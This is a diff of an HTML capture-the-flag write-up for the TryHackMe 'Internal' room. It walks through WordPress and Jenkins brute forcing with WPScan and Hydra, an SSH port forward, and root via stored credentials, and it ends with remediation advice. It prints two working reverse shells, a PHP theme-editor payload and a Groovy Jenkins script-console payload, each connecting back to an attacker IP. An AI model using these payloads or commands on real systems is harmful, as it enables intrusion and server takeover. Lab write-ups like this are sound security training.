@@ -1,98 +1,420 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Internal — OfflineDevc Writeups</title>
-  <link rel="stylesheet" href="../style.css" />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Internal — Writeup | OfflineDevc</title>
+  <link rel="stylesheet" href="../style.css"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet"/>
 </head>
 <body>
-
+  <!-- NAV -->
   <nav class="navbar">
-    <div class="nav-inner">
-      <span class="nav-logo">&gt; OfflineDevc<span class="cursor">_</span></span>
-      <div class="nav-links">
-        <a href="../index.html#about">About</a>
-        <a href="../index.html#writeups">Writeups</a>
-        <a href="../index.html#contact">Contact</a>
-      </div>
+    <a href="../index.html" class="nav-logo">&lt;OfflineDevc/&gt;</a>
+    <div class="nav-links">
+      <a href="../index.html">Home</a>
+      <a href="../index.html#writeups">Writeups</a>
     </div>
   </nav>
 
-  <header class="writeup-hero">
-    <div class="writeup-hero-inner">
-      <a href="../index.html#writeups" class="back-link">← Back to Writeups</a>
-      <div class="card-header" style="margin-bottom:12px">
-        <span class="platform thm-badge">THM</span>
-        <span class="difficulty hard-badge">Hard</span>
+  <!-- WRITEUP HEADER -->
+  <section class="writeup-hero">
+    <div class="container">
+      <div class="writeup-meta-top">
+        <a href="../index.html#writeups" class="back-link">← All Writeups</a>
+        <span class="platform-badge thm">TryHackMe</span>
       </div>
       <h1 class="writeup-title">Internal</h1>
-      <p style="color:#666;font-size:14px;margin-top:8px">Linux (Ubuntu) + Docker · WordPress WPScan → Theme RCE → Docker Container → Jenkins Hydra → SSH → Root</p>
-      <div class="meta-row">
-        <div class="meta-item">🖥 OS: <span>Linux (Ubuntu) + Docker</span></div>
-        <div class="meta-item">🎯 Target: <span><code>10.10.x.x</code></span></div>
+      <div class="writeup-badges">
+        <span class="badge diff-hard">Hard</span>
+        <span class="badge badge-os">Linux</span>
       </div>
     </div>
-  </header>
+  </section>
 
-  <article class="writeup-content">
+  <!-- WRITEUP CONTENT -->
+  <main class="writeup-body">
+    <div class="container writeup-content">
+<h1 id="internal-tryhackme-writeup">Internal - TryHackMe Writeup</h1>
+<hr />
+<h2 id="1-executive-summary-machine-overview">1. Executive Summary &amp; Machine Overview</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Metric</th>
+<th style="text-align: left;">Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Room Name</strong></td>
+<td style="text-align: left;">Internal</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Platform</strong></td>
+<td style="text-align: left;">TryHackMe</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Operating System</strong></td>
+<td style="text-align: left;">Linux (Ubuntu 18.04 LTS)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Target Hostname / IP</strong></td>
+<td style="text-align: left;"><code>internal.thm</code> (<code>10.49.187.241</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Attacker IP</strong></td>
+<td style="text-align: left;"><code>192.168.132.94</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Difficulty</strong></td>
+<td style="text-align: left;">Hard</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Key Attack Vectors</strong></td>
+<td style="text-align: left;">WordPress Admin Brute-Force via WPScan (<code>admin:********</code>), Theme Editor PHP Reverse Shell (<code>twentyseventeen/index.php</code>), Credential Harvesting in <code>/opt/wp-save.txt</code> (<code>aubreanna</code>), SSH Local Port Forwarding to Docker Network (<code>172.17.0.2:8080</code>), Jenkins HTTP Form Brute-Force via Hydra (<code>admin:********</code>), Jenkins Groovy Script Console RCE, Root Password Recovery in Docker Container (<code>/opt/note.txt</code>), Host Privilege Escalation to Root</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113191344.png" /></p>
+<h3 id="attack-chain-summary">Attack Chain Summary</h3>
+<pre><code>Recon (Nmap &amp; Hosts entry)
+  ↓  10.49.187.241 internal.thm (Port 22 SSH, Port 80 Apache)
+Gobuster → /blog/ (WordPress), /wordpress/, /phpmyadmin/
+  ↓
+WPScan on http://internal.thm/blog/wp-login.php
+  ↓  Credentials cracked: admin : ********
+WordPress Theme Editor → twentyseventeen/index.php
+  ↓  Injected PHP reverse shell → Listener 192.168.132.94:4444
+Shell as www-data
+  ↓  Enumerated /etc/passwd → user &quot;aubreanna&quot;
+  ↓  /opt/wp-save.txt → aubreanna : ********
+su aubreanna
+  ↓  user.txt → THM{********************************}
+  ↓  /home/aubreanna/jenkins.txt → Jenkins on 172.17.0.2:8080
+SSH Local Port Forwarding:
+  ↓  ssh -N -L 8080:172.17.0.2:8080 aubreanna@internal.thm
+Hydra HTTP-POST-Form Brute-Force on Jenkins (127.0.0.1:8080):
+  ↓  Cracked credentials: admin : ********
+Jenkins Dashboard → Manage Jenkins → Script Console (/script)
+  ↓  Executed Java socket reverse shell to 192.168.132.94:4445
+Shell inside Docker container as jenkins
+  ↓  /opt/note.txt → root : ********
+Host Privilege Escalation (aubreanna host session):
+  ↓  su root (Password: ********)
+root@internal → cat /root/root.txt
+  ↓  THM{********************************}
+</code></pre>
+<hr />
+<h2 id="2-phase-1-reconnaissance-web-enumeration">2. Phase 1: Reconnaissance &amp; Web Enumeration</h2>
+<h3 id="21-port-scanning-nmap">2.1 Port Scanning (Nmap)</h3>
+<p>We initiate an Nmap service scan against target <code>10.49.187.241</code>:</p>
+<pre><code class="language-bash">nmap -sT -sV -sC 10.49.187.241 -Pn
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111120058.png" /></p>
+<p><strong>Open Ports:</strong><br />
+- <strong>Port 22/tcp</strong>: OpenSSH 7.6p1 Ubuntu<br />
+- <strong>Port 80/tcp</strong>: Apache httpd 2.4.29 (Ubuntu)</p>
+<h3 id="22-local-dns-resolution">2.2 Local DNS Resolution</h3>
+<p>The web server redirects or references the hostname <code>internal.thm</code>. We map this domain to our local <code>/etc/hosts</code>:</p>
+<pre><code class="language-bash">echo &quot;10.49.187.241 internal.thm&quot; | sudo tee -a /etc/hosts
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111120133.png" /></p>
+<h3 id="23-directory-busting-gobuster">2.3 Directory Busting (Gobuster)</h3>
+<p>We enumerate web paths using Gobuster:</p>
+<pre><code class="language-bash">gobuster dir -u http://internal.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111120503.png" /></p>
+<p><strong>Identified Directories:</strong><br />
+- <code>/blog</code> (Status: 301) <code>--&gt; http://internal.thm/blog/</code> (WordPress)<br />
+- <code>/wordpress</code> (Status: 301) <code>--&gt; http://internal.thm/wordpress/</code><br />
+- <code>/javascript</code> (Status: 301)<br />
+- <code>/phpmyadmin</code> (Status: 301)</p>
+<hr />
+<h2 id="3-phase-2-wordpress-exploitation-initial-access">3. Phase 2: WordPress Exploitation &amp; Initial Access</h2>
+<h3 id="31-wordpress-login-wpscan-password-brute-force">3.1 WordPress Login &amp; WPScan Password Brute-Force</h3>
+<p>Navigating to <code>http://internal.thm/blog/wp-login.php</code>, we identify the WordPress administrative login form:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111120308.png" /></p>
+<p>We launch WPScan to brute-force the <code>admin</code> account using <code>rockyou.txt</code>:</p>
+<pre><code class="language-bash">wpscan --url http://internal.thm/blog/wp-login.php -U admin -P /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111120454.png" /></p>
+<p>WPScan identifies valid credentials after 3,917 requests:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111121004.png" /></p>
+<pre><code class="language-text">[+] Performing password attack on Wp Login against 1 user/s
+[SUCCESS] - admin / ********
+[!] Valid Combinations Found:
+| Username: admin, Password: [REDACTED]
+</code></pre>
+<blockquote>
+<p><strong>WordPress Admin Credentials:</strong> <code>admin</code> : <code>********</code></p>
+</blockquote>
+<p>We log into the WordPress dashboard:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111121112.png" /></p>
+<h3 id="32-injecting-reverse-shell-via-theme-editor">3.2 Injecting Reverse Shell via Theme Editor</h3>
+<p>In WordPress admin panel, we navigate to <strong>Appearance &gt; Theme Editor</strong>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111121153.png" /></p>
+<p>We select the active <strong>Twenty Seventeen</strong> theme and open the Main Index Template (<code>index.php</code>):</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111121248.png" /></p>
+<p>We replace the contents of <code>index.php</code> with a PHP reverse shell connecting back to our attacker machine at <code>192.168.132.94:4444</code>:</p>
+<pre><code class="language-php">&lt;?php
+// Reverse-shell callback for an authorized lab only.
+// Replace ATTACKER_VPN_IP with an address reachable from the target.
+$host = '192.168.132.94';
+$port = 4444;
+$sock = @fsockopen($host, $port, $errno, $errstr, 5);
+if (!$sock) {
+    http_response_code(500);
+    exit(&quot;connect failed: $errno\n&quot;);
+}
+$spec = [0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock];
+$proc = @proc_open('/bin/sh -i', $spec, $pipes);
+if (is_resource($proc)) {
+    proc_close($proc);
+}
+fclose($sock);
+?&gt;
+</code></pre>
+<h3 id="33-catching-the-reverse-shell">3.3 Catching the Reverse Shell</h3>
+<p>We start a listener on our attacker machine:</p>
+<pre><code class="language-bash">penelope nc -p 4444
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111121239.png" /></p>
+<p>We trigger <code>index.php</code> by visiting <code>http://internal.thm/blog/</code> (or viewing themes):</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111121340.png" /></p>
+<p>Penelope receives the incoming connection, granting a shell as <strong><code>www-data</code></strong>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111121413.png" /></p>
+<pre><code class="language-text">[New Reverse Shell] =&gt; internal 10.49.187.241 Linux-x86_64  www-data(33)
+www-data@internal:/var/www/html/wordpress$ whoami
+www-data
+</code></pre>
+<hr />
+<h2 id="4-phase-3-lateral-movement-to-user-aubreanna">4. Phase 3: Lateral Movement to User <code>aubreanna</code></h2>
+<h3 id="41-system-credential-enumeration">4.1 System &amp; Credential Enumeration</h3>
+<p>Examining <code>/var/www/html/wordpress/wp-config.php</code> exposes the local database configuration:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111121521.png" /></p>
+<pre><code class="language-php">// MySQL settings
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'wordpress' );
+define( 'DB_PASSWORD', '********' );
+define( 'DB_HOST', 'localhost' );
+</code></pre>
+<p>Checking <code>/etc/passwd</code> reveals regular user account <strong><code>aubreanna</code></strong>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111121640.png" /></p>
+<p>Searching <code>/opt</code> reveals a plaintext credential backup file named <code>wp-save.txt</code>:</p>
+<pre><code class="language-bash">cd /opt
+cat wp-save.txt
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111121913.png" /></p>
+<pre><code class="language-text">Bill,
+Aubreanna needed these credentials for something later. Let her know you have them and where they are.
 
-    <table class="info-table">
-      <tr><th>Room Name</th><td>Internal</td></tr>
-      <tr><th>Platform</th><td>TryHackMe</td></tr>
-      <tr><th>OS</th><td>Linux (Ubuntu) + Docker</td></tr>
-      <tr><th>Difficulty</th><td>Hard</td></tr>
-      <tr><th>Key Techniques</th><td>WordPress WPScan, Theme Editor RCE, Docker Pivot, Jenkins Hydra HTTP-POST</td></tr>
-    </table>
+aubreanna:********
+</code></pre>
+<blockquote>
+<p><strong>Discovered Credentials:</strong> <code>aubreanna</code> : <code>********</code></p>
+</blockquote>
+<h3 id="42-user-session-user-flag">4.2 User Session &amp; User Flag</h3>
+<p>From our reverse shell, we switch to user <code>aubreanna</code>:</p>
+<pre><code class="language-bash">su aubreanna
+# Password: [REDACTED]
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111121948.png" /></p>
+<p>In <code>/home/aubreanna</code>, we read <code>user.txt</code>:</p>
+<pre><code class="language-bash">cat user.txt
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111122019.png" /></p>
+<blockquote>
+<p>🚩 <strong>User Flag:</strong> <code>THM{********************************}</code></p>
+</blockquote>
+<hr />
+<h2 id="5-phase-4-ssh-port-forwarding-jenkins-exploitation">5. Phase 4: SSH Port Forwarding &amp; Jenkins Exploitation</h2>
+<h3 id="51-discovering-internal-jenkins-service">5.1 Discovering Internal Jenkins Service</h3>
+<p>In <code>/home/aubreanna</code>, we find <code>jenkins.txt</code>:</p>
+<pre><code class="language-bash">cat jenkins.txt
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111122034.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261111122049.png" /></p>
+<pre><code class="language-text">Internal Jenkins service is running on 172.17.0.2:8080
+</code></pre>
+<p>The Jenkins service is hosted in an internal Docker container unreachable from the external network.</p>
+<h3 id="52-ssh-local-port-forwarding">5.2 SSH Local Port Forwarding</h3>
+<p>From our attacker system, we establish an SSH local port forward tunnel through <code>aubreanna@internal.thm</code>:</p>
+<pre><code class="language-bash">ssh -N -L 8080:172.17.0.2:8080 aubreanna@internal.thm
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111122245.png" /></p>
+<p>We authenticate with the discovered user password. The tunnel forwards <code>127.0.0.1:8080</code> on our local machine directly to <code>172.17.0.2:8080</code> in the internal Docker subnet.</p>
+<h3 id="53-jenkins-authentication-brute-force-with-hydra">5.3 Jenkins Authentication Brute-Force with Hydra</h3>
+<p>Navigating to <code>http://127.0.0.1:8080/login?from=%2F</code>, we reach the Jenkins sign-in interface:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111122605.png" /></p>
+<p>We launch <strong>Hydra</strong> to brute-force the Jenkins <code>admin</code> account via the HTTP-POST form against <code>/j_acegi_security_check</code>:</p>
+<pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form://127.0.0.1:8080/j_acegi_security_check:'j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:F=Invalid'
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111123119.png" /></p>
+<p><strong>Hydra cracking result:</strong></p>
+<pre><code class="language-text">[8080][http-post-form] host: 127.0.0.1   login: admin   password: [REDACTED]
+1 of 1 target successfully completed, 1 valid password found
+</code></pre>
+<blockquote>
+<p><strong>Jenkins Admin Credentials:</strong> <code>admin</code> : <code>********</code></p>
+</blockquote>
+<p>We authenticate to Jenkins with <code>admin:********</code> and access the dashboard:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111123141.png" /></p>
+<h3 id="54-remote-code-execution-via-jenkins-script-console">5.4 Remote Code Execution via Jenkins Script Console</h3>
+<p>In the Jenkins administration menu, we navigate to <strong>Manage Jenkins &gt; Script Console</strong> (<code>http://127.0.0.1:8080/script</code>):</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111123350.png" /></p>
+<p>We input a Groovy Java socket reverse shell targeting <code>192.168.132.94:4445</code>:</p>
+<pre><code class="language-groovy">String host=&quot;192.168.132.94&quot;;
+int port=4445;
+String cmd=&quot;/bin/bash&quot;;
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){
+    while(pi.available()&gt;0)so.write(pi.read());
+    while(pe.available()&gt;0)so.write(pe.read());
+    while(si.available()&gt;0)po.write(si.read());
+    so.flush();po.flush();
+    Thread.sleep(50);
+    try {p.exitValue();break;}catch (Exception e){}
+};
+p.destroy();s.close();
+</code></pre>
+<p>We start a listener on our attacker machine:</p>
+<pre><code class="language-bash">penelope nc -p 4445
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111123357.png" /></p>
+<p>We click <strong>Run</strong> in the Jenkins Script Console. Penelope receives the reverse shell connection:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111123418.png" /></p>
+<pre><code class="language-text">[New Reverse Shell] =&gt; jenkins 10.49.187.241 Linux-x86_64  jenkins(1000)
+jenkins@jenkins:/$ whoami
+jenkins
+</code></pre>
+<p>We have established code execution inside the Docker container as user <strong><code>jenkins</code></strong>.</p>
+<hr />
+<h2 id="6-phase-5-privilege-escalation-to-host-root">6. Phase 5: Privilege Escalation to Host Root</h2>
+<h3 id="61-finding-root-password-in-container">6.1 Finding Root Password in Container</h3>
+<p>Inside the Jenkins Docker container, we check <code>/opt</code>:</p>
+<pre><code class="language-bash">jenkins@jenkins:/$ cd /opt
+jenkins@jenkins:/opt$ ls
+note.txt
+jenkins@jenkins:/opt$ cat note.txt
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111123438.png" /></p>
+<pre><code class="language-text">Aubreanna,
 
-    <h2>// Attack Chain</h2>
-    <div class="attack-chain">Recon (Nmap)
-  → Port 22 (SSH) · Port 80 (Apache + WordPress)
-  → WPScan → username: admin → brute-force → admin : ████████
-  → WP Admin → Appearance > Theme Editor > twentyseventeen/index.php → PHP shell
-  → Shell as www-data
-  → /etc/hosts → Docker container: 172.17.0.2
-  → Pivot into Docker → Jenkins on :8080
-  → Hydra HTTP POST → admin : ████████
-  → Jenkins Groovy Script Console → reverse shell
-  → Credentials in /var/jenkins_home → SSH key for aubreanna
-  → SSH aubreanna → user.txt
-  → Port forward Jenkins → password in note.txt → su root
-  → root.txt</div>
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here. Use them if you need access to the root user account.
 
-    <h2>// Methodology</h2>
-    <p>This writeup follows the standard penetration testing lifecycle:
-    <strong>Reconnaissance</strong> → <strong>Enumeration</strong> → <strong>Exploitation</strong> →
-    <strong>Post-Exploitation</strong> → <strong>Privilege Escalation</strong> → <strong>Remediation</strong>.</p>
-    <p style="color:#555;font-size:13px;margin-top:12px">
-      📸 Full screenshot evidence is available in the original report.
-      Sensitive flags and credentials are redacted in compliance with TryHackMe guidelines.
-    </p>
+root:********
+</code></pre>
+<blockquote>
+<p><strong>Host Root Credentials:</strong> <code>root</code> : <code>********</code></p>
+</blockquote>
+<p>Attempting <code>su root</code> inside the container fails:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111123542.png" /></p>
+<h3 id="62-host-privilege-escalation-to-root">6.2 Host Privilege Escalation to Root</h3>
+<p>Since the credentials belong to the host system root account, we return to our SSH session on the host machine (<code>aubreanna@internal</code>):</p>
+<pre><code class="language-bash">aubreanna@internal:~$ su root
+Password: [REDACTED]
+root@internal:/home/aubreanna#
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111123549.png" /></p>
+<p>We are now <strong>root</strong> on <code>internal</code>! We read the final root flag:</p>
+<pre><code class="language-bash">root@internal:~# cat /root/root.txt
+THM{********************************}
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111123612.png" /></p>
+<blockquote>
+<p>🚩 <strong>Root Flag:</strong> <code>THM{********************************}</code></p>
+</blockquote>
+<hr />
+<h2 id="7-security-mitigations-remediation">7. Security Mitigations &amp; Remediation</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Vulnerability</th>
+<th style="text-align: left;">Impact</th>
+<th style="text-align: left;">Recommended Remediation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Weak WordPress Admin Password</strong></td>
+<td style="text-align: left;">Administrative CMS compromise and theme modification RCE.</td>
+<td style="text-align: left;">Enforce strong password complexity policies and implement rate limiting on <code>wp-login.php</code>.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Theme File Editor Enabled</strong></td>
+<td style="text-align: left;">Allows authenticated administrators to inject PHP web shells.</td>
+<td style="text-align: left;">Disable the file editor in <code>wp-config.php</code> via <code>define('DISALLOW_FILE_EDIT', true);</code>.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Plaintext Credentials in Filesystem (<code>wp-save.txt</code>)</strong></td>
+<td style="text-align: left;">Lateral movement and unauthorized user account takeover.</td>
+<td style="text-align: left;">Never store cleartext passwords in configuration notes; use encrypted secret storage.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Weak Jenkins Admin Password</strong></td>
+<td style="text-align: left;">Container takeover and arbitrary Groovy code execution via Script Console.</td>
+<td style="text-align: left;">Mandate complex passwords, enable multi-factor authentication (MFA), and restrict access to <code>/script</code>.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Host Root Password Stored in Docker Container (<code>note.txt</code>)</strong></td>
+<td style="text-align: left;">Complete host takeover.</td>
+<td style="text-align: left;">Strictly isolate container environments and never store host credentials inside Docker containers.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="8-tools-used">8. Tools Used</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Tool</th>
+<th style="text-align: left;">Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Nmap</strong></td>
+<td style="text-align: left;">Port and service discovery</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Gobuster</strong></td>
+<td style="text-align: left;">Web directory brute-forcing</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>WPScan</strong></td>
+<td style="text-align: left;">WordPress administrative brute-force (<code>admin:********</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Penelope</strong></td>
+<td style="text-align: left;">Enhanced multi-session reverse shell listener</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>OpenSSH</strong></td>
+<td style="text-align: left;">SSH tunneling / local port forwarding (<code>ssh -N -L 8080:172.17.0.2:8080</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Hydra</strong></td>
+<td style="text-align: left;">Jenkins HTTP-POST form authentication brute-forcing (<code>admin:********</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Jenkins Script Console</strong></td>
+<td style="text-align: left;">Groovy Java socket reverse shell execution</td>
+</tr>
+</tbody>
+</table>
+    </div>
+  </main>
 
-    <h2>// Tools Used</h2>
-    <ul style="color:#888;font-size:13px;line-height:2.2;margin-left:20px">
-      <li><code>Nmap</code></li>
-      <li><code>WPScan</code></li>
-      <li><code>Hydra</code></li>
-      <li><code>Penelope</code></li>
-      <li><code>SSH Port Forwarding</code></li>
-    </ul>
-
-  </article>
-
+  <!-- FOOTER -->
   <footer class="footer">
-    <div class="footer-inner">
-      <div class="footer-links">
-        <a href="https://github.com/OfflineDevc" target="_blank">GitHub</a>
-        <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a>
-        <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank">HackTheBox</a>
-        <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a>
-      </div>
-      <p class="footer-copy">© 2026 Kun Poonkasetvatana. Educational purposes only.</p>
-    </div>
+    <p>Built by <a href="https://github.com/OfflineDevc" target="_blank">OfflineDevc</a> · 
+       <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a> · 
+       <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a></p>
   </footer>
-
 </body>
 </html>
